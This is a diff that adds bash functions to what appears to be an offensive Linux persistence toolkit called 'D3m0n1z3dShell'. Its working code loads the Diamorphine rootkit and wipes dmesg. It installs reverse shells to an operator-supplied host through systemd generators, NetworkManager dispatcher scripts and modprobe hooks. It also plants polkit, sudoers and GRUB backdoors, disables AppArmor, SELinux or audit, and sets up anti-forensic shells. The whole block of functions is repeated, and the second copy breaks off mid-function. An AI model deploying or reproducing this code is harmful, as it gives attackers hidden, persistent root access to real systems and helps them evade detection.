@@ -3455,6 +3455,458 @@ winStealth(){
     echo -e "\033[1;33m[*] Run: bash scripts/win_stealth.sh from the D3m0n1z3dShell directory.\033[0m"
 }
 
+diamorphineRootkit(){
+    echo " [*] Diamorphine Rootkit Auto-Deploy (T1014) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    CLONE_DIR="/var/tmp/.d3m0n_diamorphine"
+    echo -e "  ${CYAN}[1]${NC} Install (git clone + make + insmod)"
+    echo -e "  ${CYAN}[2]${NC} Hide process (kill -31 PID)"
+    echo -e "  ${CYAN}[3]${NC} Elevate to root (kill -64)"
+    echo -e "  ${CYAN}[4]${NC} Toggle visibility (kill -63)"
+    echo -e "  ${CYAN}[5]${NC} Uninstall"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            for cmd in git make gcc insmod; do command -v "$cmd" >/dev/null 2>&1 || { echo "[-] $cmd not found"; return; }; done
+            [[ ! -d "/lib/modules/$(uname -r)/build" ]] && { echo "[-] Kernel headers missing"; return; }
+            rm -rf "$CLONE_DIR"
+            git clone https://github.com/m0nad/Diamorphine "$CLONE_DIR" 2>/dev/null
+            make -C "$CLONE_DIR" 2>&1 | tail -3
+            insmod "$CLONE_DIR/diamorphine.ko" && echo -e "${GREEN}[+] Loaded${NC}" || echo -e "${RED}[-] Failed${NC}"
+            dmesg -C 2>/dev/null; make -C "$CLONE_DIR" clean 2>/dev/null; rm -rf "$CLONE_DIR"
+            echo "  kill -31 PID=hide, kill -63 PID=root, kill -64 PID=toggle module"
+            ;;
+        2) read -p "PID: " P; kill -31 "$P" 2>/dev/null; echo "[+] Signal sent" ;;
+        3) kill -64 $$; echo "[+] Signal sent"; id ;;
+        4) kill -63 $$; echo "[+] Toggled"; lsmod | grep diamorphine || echo "(hidden)" ;;
+        5) kill -63 $$ 2>/dev/null; rmmod diamorphine 2>/dev/null; echo "[+] Removed" ;;
+    esac
+}
+
+systemdGenerator(){
+    echo " [*] Systemd Generator Persistence (T1543.002) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Install generator (revshell)  [2] Custom command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            GEN_DIR="/etc/systemd/system-generators"; mkdir -p "$GEN_DIR"
+            cat > "${GEN_DIR}/d3m0n-persist" << GEOF
+#!/bin/bash\nNORMAL_DIR="\$1"\nmkdir -p "\${NORMAL_DIR}"\ncat > "\${NORMAL_DIR}/d3m0n-persist.service" << SEOF\n[Unit]\nDescription=System Cache Manager\nAfter=network.target\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'\nRemainAfterExit=yes\n[Install]\nWantedBy=multi-user.target\nSEOF\nmkdir -p "\${NORMAL_DIR}/multi-user.target.wants"\nln -sf "\${NORMAL_DIR}/d3m0n-persist.service" "\${NORMAL_DIR}/multi-user.target.wants/d3m0n-persist.service"
+GEOF
+            chmod 755 "${GEN_DIR}/d3m0n-persist"
+            echo -e "${GREEN}[+] Generator installed${NC}"
+            ;;
+        2)
+            read -p "Command: " CMD
+            GEN_DIR="/etc/systemd/system-generators"; mkdir -p "$GEN_DIR"
+            cat > "${GEN_DIR}/d3m0n-persist" << GEOF
+#!/bin/bash\nNORMAL_DIR="\$1"\nmkdir -p "\${NORMAL_DIR}"\ncat > "\${NORMAL_DIR}/d3m0n-persist.service" << SEOF\n[Unit]\nDescription=System Cache Manager\nAfter=network.target\n[Service]\nType=oneshot\nExecStart=/bin/bash -c '${CMD}'\nRemainAfterExit=yes\n[Install]\nWantedBy=multi-user.target\nSEOF
+GEOF
+            chmod 755 "${GEN_DIR}/d3m0n-persist"
+            echo -e "${GREEN}[+] Generator installed${NC}"
+            ;;
+        3) rm -f /etc/systemd/system-generators/d3m0n-* /usr/local/lib/systemd/system-generators/d3m0n-* /lib/systemd/system-generators/d3m0n-*; systemctl daemon-reload 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+nmDispatcher(){
+    echo " [*] NetworkManager Dispatcher Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    DISP_DIR="/etc/NetworkManager/dispatcher.d"
+    echo -e "  [1] Revshell on interface up  [2] Custom command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            mkdir -p "$DISP_DIR"
+            cat > "${DISP_DIR}/01-d3m0n" << EOF
+#!/bin/bash\n# d3m0n_nm\nIFACE=\$1; ACTION=\$2\nif [ "\$ACTION" = "up" ]; then nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &; fi
+EOF
+            chmod 755 "${DISP_DIR}/01-d3m0n"
+            echo -e "${GREEN}[+] Dispatcher installed${NC}"
+            ;;
+        2) read -p "Command: " CMD; read -p "Event [up]: " EV; EV="${EV:-up}"
+            mkdir -p "$DISP_DIR"
+            echo -e "#!/bin/bash\n# d3m0n_nm\nIFACE=\$1; ACTION=\$2\nif [ \"\$ACTION\" = \"${EV}\" ]; then ${CMD} &; fi" > "${DISP_DIR}/01-d3m0n"
+            chmod 755 "${DISP_DIR}/01-d3m0n"
+            echo -e "${GREEN}[+] Installed${NC}"
+            ;;
+        3) rm -f "${DISP_DIR}"/*d3m0n*; echo "[+] Cleaned" ;;
+    esac
+}
+
+polkitBackdoor(){
+    echo " [*] Polkit Privilege Escalation Backdoor (T1548) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] JS rule (polkit>=0.106)  [2] .pkla rule (older)  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Username: " U; mkdir -p /etc/polkit-1/rules.d
+            echo "polkit.addRule(function(action,subject){if(subject.user==\"${U}\"){return polkit.Result.YES;}});" > /etc/polkit-1/rules.d/49-d3m0n-nopasswd.rules
+            echo -e "${GREEN}[+] Polkit JS rule installed for ${U}${NC}" ;;
+        2) read -p "Username: " U; mkdir -p /etc/polkit-1/localauthority/50-local.d
+            printf "[d3m0n_polkit]\nIdentity=unix-user:${U}\nAction=*\nResultAny=yes\nResultInactive=yes\nResultActive=yes\n" > /etc/polkit-1/localauthority/50-local.d/d3m0n-nopasswd.pkla
+            echo -e "${GREEN}[+] Polkit .pkla rule installed for ${U}${NC}" ;;
+        3) rm -f /etc/polkit-1/rules.d/*d3m0n* /etc/polkit-1/localauthority/50-local.d/*d3m0n*; echo "[+] Cleaned" ;;
+    esac
+}
+
+sudoersBackdoor(){
+    echo " [*] Sudoers Backdoor (T1548.003) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] NOPASSWD ALL for user  [2] NOPASSWD for command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Username: " U; echo "# d3m0n_sudoers" > /etc/sudoers.d/d3m0n-backdoor
+            echo "${U} ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers.d/d3m0n-backdoor
+            chmod 440 /etc/sudoers.d/d3m0n-backdoor
+            visudo -c -f /etc/sudoers.d/d3m0n-backdoor >/dev/null 2>&1 && echo -e "${GREEN}[+] Installed${NC}" || { rm -f /etc/sudoers.d/d3m0n-backdoor; echo "[-] Syntax error"; } ;;
+        2) read -p "Username: " U; read -p "Command: " C
+            echo "# d3m0n_sudoers" > /etc/sudoers.d/d3m0n-backdoor
+            echo "${U} ALL=(ALL:ALL) NOPASSWD: ${C}" >> /etc/sudoers.d/d3m0n-backdoor
+            chmod 440 /etc/sudoers.d/d3m0n-backdoor
+            visudo -c -f /etc/sudoers.d/d3m0n-backdoor >/dev/null 2>&1 && echo -e "${GREEN}[+] Installed${NC}" || { rm -f /etc/sudoers.d/d3m0n-backdoor; echo "[-] Syntax error"; } ;;
+        3) rm -f /etc/sudoers.d/d3m0n-*; echo "[+] Cleaned" ;;
+    esac
+}
+
+ebpfHide(){
+    echo " [*] eBPF-Based Process/File Hiding (T1564) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Install bcc-tools  [2] Clone ebpfkit  [3] Clone TripleCross  [4] Status"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) apt update -qq && apt install -y bpfcc-tools bpftrace python3-bpfcc linux-headers-"$(uname -r)" 2>&1 | tail -5; echo -e "${GREEN}[+] Installed${NC}" ;;
+        2) rm -rf /var/tmp/.d3m0n_ebpf_rk; git clone https://github.com/Gui774ume/ebpfkit /var/tmp/.d3m0n_ebpf_rk 2>&1 | tail -3; echo -e "${GREEN}[+] Cloned to /var/tmp/.d3m0n_ebpf_rk${NC}" ;;
+        3) rm -rf /var/tmp/.d3m0n_ebpf_rk; git clone https://github.com/h3xduck/TripleCross /var/tmp/.d3m0n_ebpf_rk 2>&1 | tail -3; echo -e "${GREEN}[+] Cloned to /var/tmp/.d3m0n_ebpf_rk${NC}" ;;
+        4) echo "Kernel: $(uname -r)"; command -v bpftool >/dev/null 2>&1 && bpftool prog list 2>/dev/null | head -5 || echo "bpftool not found" ;;
+    esac
+}
+
+modprobeHijack(){
+    echo " [*] Modprobe.d Event Hijacking (T1547.006) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Hook module (revshell)  [2] Hook module (custom)  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Module [usb-storage]: " MOD; MOD="${MOD:-usb-storage}"
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            RMOD=$(which modprobe 2>/dev/null || echo /sbin/modprobe)
+            echo "# d3m0n_modprobe" > "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo "install ${MOD} /bin/bash -c 'nohup bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'; ${RMOD} --ignore-install ${MOD}" >> "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo -e "${GREEN}[+] Hook installed for ${MOD}${NC}" ;;
+        2) read -p "Module: " MOD; read -p "Command: " CMD
+            RMOD=$(which modprobe 2>/dev/null || echo /sbin/modprobe)
+            echo "# d3m0n_modprobe" > "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo "install ${MOD} ${CMD}; ${RMOD} --ignore-install ${MOD}" >> "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo -e "${GREEN}[+] Hook installed${NC}" ;;
+        3) rm -f /etc/modprobe.d/d3m0n-*; echo "[+] Cleaned" ;;
+    esac
+}
+
+grubBackdoor(){
+    echo " [*] GRUB Bootloader Backdoor (T1542) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Hidden GRUB entry (init=/bin/bash)  [2] Disable security module  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            K=$(ls /boot/vmlinuz-* 2>/dev/null | sort -V | tail -1)
+            I=$(ls /boot/initrd.img-* /boot/initramfs-* 2>/dev/null | sort -V | tail -1)
+            R=$(findmnt / -no SOURCE 2>/dev/null)
+            cat > /etc/grub.d/41_d3m0n_recovery << GEOF
+#!/bin/sh\nexec tail -n +3 \$0\nmenuentry 'System Recovery Mode' --class os --unrestricted {\n    set root='(hd0,1)'\n    linux ${K} root=${R} ro init=/bin/bash\n    $([ -n "$I" ] && echo "initrd ${I}")\n}
+GEOF
+            chmod 755 /etc/grub.d/41_d3m0n_recovery
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Hidden GRUB entry added${NC}" ;;
+        2)
+            echo -e "  [a] apparmor=0  [b] selinux=0  [c] audit=0"
+            read -p "Choice: " P
+            case "$P" in a) PA="apparmor=0";; b) PA="selinux=0";; c) PA="audit=0";; *) return;; esac
+            cp /etc/default/grub /etc/default/grub.d3m0n.bak 2>/dev/null
+            sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\"\(.*\)\"|GRUB_CMDLINE_LINUX_DEFAULT=\"\1 ${PA}\"|" /etc/default/grub
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] ${PA} added — reboot to apply${NC}" ;;
+        3) rm -f /etc/grub.d/41_d3m0n_*
+            [[ -f /etc/default/grub.d3m0n.bak ]] && cp /etc/default/grub.d3m0n.bak /etc/default/grub && rm -f /etc/default/grub.d3m0n.bak
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo "[+] Cleaned" ;;
+    esac
+}
+
+nsStashspace(){
+    echo " [*] Mount Namespace Stashspace (T1564.001) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    echo -e "  [1] Create stashspace (root)  [2] Create (unprivileged)  [3] Access  [4] Anti-forensic shell  [5] Detect  [6] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            [[ $EUID -ne 0 ]] && { echo "Root required. Use option 2."; return; }
+            read -p "PID to join: " JP; read -p "Mount path [/root]: " SP; SP="${SP:-/root}"
+            nsenter -t "$JP" --mount /bin/bash -c "mount -t tmpfs tmpfs '${SP}' && echo '[+] Stashspace at ${SP}' && exec /bin/bash" ;;
+        2)
+            read -p "Mount path [/tmp]: " SP; SP="${SP:-/tmp}"
+            unshare -m -U --map-root-user /bin/bash -c "mount -t tmpfs tmpfs '${SP}' && echo '[+] Stashspace at ${SP}' && exec /bin/bash" ;;
+        3)
+            read -p "PID to access: " AP
+            [[ $EUID -eq 0 ]] && nsenter -t "$AP" -m /bin/bash || nsenter -t "$AP" -m -U --preserve-credentials /bin/bash ;;
+        4)
+            echo "[*] Anti-forensic: no history, no atime"
+            if [[ $EUID -eq 0 ]]; then
+                unshare -m /bin/bash -c 'mount -t tmpfs tmpfs "$HOME"; for f in /etc/nsswitch.conf /etc/bash.bashrc /etc/profile; do [ -f "$f" ] && mount --bind /dev/null "$f" 2>/dev/null; done; echo "[+] Active"; exec /bin/bash --norc --noprofile'
+            else
+                unshare -m -U --map-root-user /bin/bash -c 'mount -t tmpfs tmpfs "$HOME"; echo "[+] Active"; exec /bin/bash --norc --noprofile'
+            fi ;;
+        5)
+            DEFAULT_NS=$(readlink /proc/$$/ns/mnt)
+            ps -eo pid,ppid,comm --no-headers 2>/dev/null | while read -r pid ppid comm; do
+                [[ "$ppid" == "2" ]] && continue; [[ -e "/proc/$pid/ns/mnt" ]] || continue
+                ns=$(readlink "/proc/$pid/ns/mnt" 2>/dev/null); [[ "$ns" == "$DEFAULT_NS" ]] && continue
+                grep -qE 'system.slice|init.scope|systemd' "/proc/$pid/cgroup" 2>/dev/null && continue
+                echo "  [!] PID $pid ($comm) ns=$ns"
+            done ;;
+        6) [[ -f /var/tmp/.d3m0n_stash_pid ]] && { kill $(cat /var/tmp/.d3m0n_stash_pid) 2>/dev/null; rm -f /var/tmp/.d3m0n_stash_pid; }
+            rm -f /var/tmp/.d3m0n_stashd; echo "[+] Cleaned" ;;
+    esac
+}
+
+diamorphineRootkit(){
+    echo " [*] Diamorphine Rootkit Auto-Deploy (T1014) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    CLONE_DIR="/var/tmp/.d3m0n_diamorphine"
+    echo -e "  ${CYAN}[1]${NC} Install (git clone + make + insmod)"
+    echo -e "  ${CYAN}[2]${NC} Hide process (kill -31 PID)"
+    echo -e "  ${CYAN}[3]${NC} Elevate to root (kill -64)"
+    echo -e "  ${CYAN}[4]${NC} Toggle visibility (kill -63)"
+    echo -e "  ${CYAN}[5]${NC} Uninstall"
+    read -p "Choice [1-5]: " OPT
+    case "$OPT" in
+        1)
+            for cmd in git make gcc insmod; do command -v "$cmd" >/dev/null 2>&1 || { echo "[-] $cmd not found"; return; }; done
+            [[ ! -d "/lib/modules/$(uname -r)/build" ]] && { echo "[-] Kernel headers missing"; return; }
+            rm -rf "$CLONE_DIR"
+            git clone https://github.com/m0nad/Diamorphine "$CLONE_DIR" 2>/dev/null
+            make -C "$CLONE_DIR" 2>&1 | tail -3
+            insmod "$CLONE_DIR/diamorphine.ko" && echo -e "${GREEN}[+] Loaded${NC}" || echo -e "${RED}[-] Failed${NC}"
+            dmesg -C 2>/dev/null; make -C "$CLONE_DIR" clean 2>/dev/null; rm -rf "$CLONE_DIR"
+            echo "  kill -31 PID=hide, kill -63 PID=root, kill -64 PID=toggle module"
+            ;;
+        2) read -p "PID: " P; kill -31 "$P" 2>/dev/null; echo "[+] Signal sent" ;;
+        3) kill -64 $$; echo "[+] Signal sent"; id ;;
+        4) kill -63 $$; echo "[+] Toggled"; lsmod | grep diamorphine || echo "(hidden)" ;;
+        5) kill -63 $$ 2>/dev/null; rmmod diamorphine 2>/dev/null; echo "[+] Removed" ;;
+    esac
+}
+
+systemdGenerator(){
+    echo " [*] Systemd Generator Persistence (T1543.002) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Install generator (revshell)  [2] Custom command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            GEN_DIR="/etc/systemd/system-generators"; mkdir -p "$GEN_DIR"
+            cat > "${GEN_DIR}/d3m0n-persist" << GEOF
+#!/bin/bash\nNORMAL_DIR="\$1"\nmkdir -p "\${NORMAL_DIR}"\ncat > "\${NORMAL_DIR}/d3m0n-persist.service" << SEOF\n[Unit]\nDescription=System Cache Manager\nAfter=network.target\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'\nRemainAfterExit=yes\n[Install]\nWantedBy=multi-user.target\nSEOF\nmkdir -p "\${NORMAL_DIR}/multi-user.target.wants"\nln -sf "\${NORMAL_DIR}/d3m0n-persist.service" "\${NORMAL_DIR}/multi-user.target.wants/d3m0n-persist.service"
+GEOF
+            chmod 755 "${GEN_DIR}/d3m0n-persist"
+            echo -e "${GREEN}[+] Generator installed${NC}"
+            ;;
+        2)
+            read -p "Command: " CMD
+            GEN_DIR="/etc/systemd/system-generators"; mkdir -p "$GEN_DIR"
+            cat > "${GEN_DIR}/d3m0n-persist" << GEOF
+#!/bin/bash\nNORMAL_DIR="\$1"\nmkdir -p "\${NORMAL_DIR}"\ncat > "\${NORMAL_DIR}/d3m0n-persist.service" << SEOF\n[Unit]\nDescription=System Cache Manager\nAfter=network.target\n[Service]\nType=oneshot\nExecStart=/bin/bash -c '${CMD}'\nRemainAfterExit=yes\n[Install]\nWantedBy=multi-user.target\nSEOF
+GEOF
+            chmod 755 "${GEN_DIR}/d3m0n-persist"
+            echo -e "${GREEN}[+] Generator installed${NC}"
+            ;;
+        3) rm -f /etc/systemd/system-generators/d3m0n-* /usr/local/lib/systemd/system-generators/d3m0n-* /lib/systemd/system-generators/d3m0n-*; systemctl daemon-reload 2>/dev/null; echo "[+] Cleaned" ;;
+    esac
+}
+
+nmDispatcher(){
+    echo " [*] NetworkManager Dispatcher Persistence (T1546) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    DISP_DIR="/etc/NetworkManager/dispatcher.d"
+    echo -e "  [1] Revshell on interface up  [2] Custom command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            mkdir -p "$DISP_DIR"
+            cat > "${DISP_DIR}/01-d3m0n" << EOF
+#!/bin/bash\n# d3m0n_nm\nIFACE=\$1; ACTION=\$2\nif [ "\$ACTION" = "up" ]; then nohup /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' >/dev/null 2>&1 &; fi
+EOF
+            chmod 755 "${DISP_DIR}/01-d3m0n"
+            echo -e "${GREEN}[+] Dispatcher installed${NC}"
+            ;;
+        2) read -p "Command: " CMD; read -p "Event [up]: " EV; EV="${EV:-up}"
+            mkdir -p "$DISP_DIR"
+            echo -e "#!/bin/bash\n# d3m0n_nm\nIFACE=\$1; ACTION=\$2\nif [ \"\$ACTION\" = \"${EV}\" ]; then ${CMD} &; fi" > "${DISP_DIR}/01-d3m0n"
+            chmod 755 "${DISP_DIR}/01-d3m0n"
+            echo -e "${GREEN}[+] Installed${NC}"
+            ;;
+        3) rm -f "${DISP_DIR}"/*d3m0n*; echo "[+] Cleaned" ;;
+    esac
+}
+
+polkitBackdoor(){
+    echo " [*] Polkit Privilege Escalation Backdoor (T1548) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] JS rule (polkit>=0.106)  [2] .pkla rule (older)  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Username: " U; mkdir -p /etc/polkit-1/rules.d
+            echo "polkit.addRule(function(action,subject){if(subject.user==\"${U}\"){return polkit.Result.YES;}});" > /etc/polkit-1/rules.d/49-d3m0n-nopasswd.rules
+            echo -e "${GREEN}[+] Polkit JS rule installed for ${U}${NC}" ;;
+        2) read -p "Username: " U; mkdir -p /etc/polkit-1/localauthority/50-local.d
+            printf "[d3m0n_polkit]\nIdentity=unix-user:${U}\nAction=*\nResultAny=yes\nResultInactive=yes\nResultActive=yes\n" > /etc/polkit-1/localauthority/50-local.d/d3m0n-nopasswd.pkla
+            echo -e "${GREEN}[+] Polkit .pkla rule installed for ${U}${NC}" ;;
+        3) rm -f /etc/polkit-1/rules.d/*d3m0n* /etc/polkit-1/localauthority/50-local.d/*d3m0n*; echo "[+] Cleaned" ;;
+    esac
+}
+
+sudoersBackdoor(){
+    echo " [*] Sudoers Backdoor (T1548.003) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] NOPASSWD ALL for user  [2] NOPASSWD for command  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Username: " U; echo "# d3m0n_sudoers" > /etc/sudoers.d/d3m0n-backdoor
+            echo "${U} ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers.d/d3m0n-backdoor
+            chmod 440 /etc/sudoers.d/d3m0n-backdoor
+            visudo -c -f /etc/sudoers.d/d3m0n-backdoor >/dev/null 2>&1 && echo -e "${GREEN}[+] Installed${NC}" || { rm -f /etc/sudoers.d/d3m0n-backdoor; echo "[-] Syntax error"; } ;;
+        2) read -p "Username: " U; read -p "Command: " C
+            echo "# d3m0n_sudoers" > /etc/sudoers.d/d3m0n-backdoor
+            echo "${U} ALL=(ALL:ALL) NOPASSWD: ${C}" >> /etc/sudoers.d/d3m0n-backdoor
+            chmod 440 /etc/sudoers.d/d3m0n-backdoor
+            visudo -c -f /etc/sudoers.d/d3m0n-backdoor >/dev/null 2>&1 && echo -e "${GREEN}[+] Installed${NC}" || { rm -f /etc/sudoers.d/d3m0n-backdoor; echo "[-] Syntax error"; } ;;
+        3) rm -f /etc/sudoers.d/d3m0n-*; echo "[+] Cleaned" ;;
+    esac
+}
+
+ebpfHide(){
+    echo " [*] eBPF-Based Process/File Hiding (T1564) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Install bcc-tools  [2] Clone ebpfkit  [3] Clone TripleCross  [4] Status"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) apt update -qq && apt install -y bpfcc-tools bpftrace python3-bpfcc linux-headers-"$(uname -r)" 2>&1 | tail -5; echo -e "${GREEN}[+] Installed${NC}" ;;
+        2) rm -rf /var/tmp/.d3m0n_ebpf_rk; git clone https://github.com/Gui774ume/ebpfkit /var/tmp/.d3m0n_ebpf_rk 2>&1 | tail -3; echo -e "${GREEN}[+] Cloned to /var/tmp/.d3m0n_ebpf_rk${NC}" ;;
+        3) rm -rf /var/tmp/.d3m0n_ebpf_rk; git clone https://github.com/h3xduck/TripleCross /var/tmp/.d3m0n_ebpf_rk 2>&1 | tail -3; echo -e "${GREEN}[+] Cloned to /var/tmp/.d3m0n_ebpf_rk${NC}" ;;
+        4) echo "Kernel: $(uname -r)"; command -v bpftool >/dev/null 2>&1 && bpftool prog list 2>/dev/null | head -5 || echo "bpftool not found" ;;
+    esac
+}
+
+modprobeHijack(){
+    echo " [*] Modprobe.d Event Hijacking (T1547.006) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Hook module (revshell)  [2] Hook module (custom)  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1) read -p "Module [usb-storage]: " MOD; MOD="${MOD:-usb-storage}"
+            read -p "IP: " LHOST; read -p "Port: " LPORT
+            RMOD=$(which modprobe 2>/dev/null || echo /sbin/modprobe)
+            echo "# d3m0n_modprobe" > "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo "install ${MOD} /bin/bash -c 'nohup bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1 &'; ${RMOD} --ignore-install ${MOD}" >> "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo -e "${GREEN}[+] Hook installed for ${MOD}${NC}" ;;
+        2) read -p "Module: " MOD; read -p "Command: " CMD
+            RMOD=$(which modprobe 2>/dev/null || echo /sbin/modprobe)
+            echo "# d3m0n_modprobe" > "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo "install ${MOD} ${CMD}; ${RMOD} --ignore-install ${MOD}" >> "/etc/modprobe.d/d3m0n-${MOD}.conf"
+            echo -e "${GREEN}[+] Hook installed${NC}" ;;
+        3) rm -f /etc/modprobe.d/d3m0n-*; echo "[+] Cleaned" ;;
+    esac
+}
+
+grubBackdoor(){
+    echo " [*] GRUB Bootloader Backdoor (T1542) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
+    [[ $EUID -ne 0 ]] && { echo "Root required."; return; }
+    echo -e "  [1] Hidden GRUB entry (init=/bin/bash)  [2] Disable security module  [3] Cleanup"
+    read -p "Choice: " OPT
+    case "$OPT" in
+        1)
+            K=$(ls /boot/vmlinuz-* 2>/dev/null | sort -V | tail -1)
+            I=$(ls /boot/initrd.img-* /boot/initramfs-* 2>/dev/null | sort -V | tail -1)
+            R=$(findmnt / -no SOURCE 2>/dev/null)
+            cat > /etc/grub.d/41_d3m0n_recovery << GEOF
+#!/bin/sh\nexec tail -n +3 \$0\nmenuentry 'System Recovery Mode' --class os --unrestricted {\n    set root='(hd0,1)'\n    linux ${K} root=${R} ro init=/bin/bash\n    $([ -n "$I" ] && echo "initrd ${I}")\n}
+GEOF
+            chmod 755 /etc/grub.d/41_d3m0n_recovery
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] Hidden GRUB entry added${NC}" ;;
+        2)
+            echo -e "  [a] apparmor=0  [b] selinux=0  [c] audit=0"
+            read -p "Choice: " P
+            case "$P" in a) PA="apparmor=0";; b) PA="selinux=0";; c) PA="audit=0";; *) return;; esac
+            cp /etc/default/grub /etc/default/grub.d3m0n.bak 2>/dev/null
+            sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\"\(.*\)\"|GRUB_CMDLINE_LINUX_DEFAULT=\"\1 ${PA}\"|" /etc/default/grub
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo -e "${GREEN}[+] ${PA} added — reboot to apply${NC}" ;;
+        3) rm -f /etc/grub.d/41_d3m0n_*
+            [[ -f /etc/default/grub.d3m0n.bak ]] && cp /etc/default/grub.d3m0n.bak /etc/default/grub && rm -f /etc/default/grub.d3m0n.bak
+            update-grub 2>/dev/null || grub2-mkconfig -o /boot/grub2/grub.cfg 2>/dev/null
+            echo "[+] Cleaned" ;;
+    esac
+}
+
+nsStashspace(){
+    echo " [*] Mount Namespace Stashspace (T1564.001) [*]"
+    RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
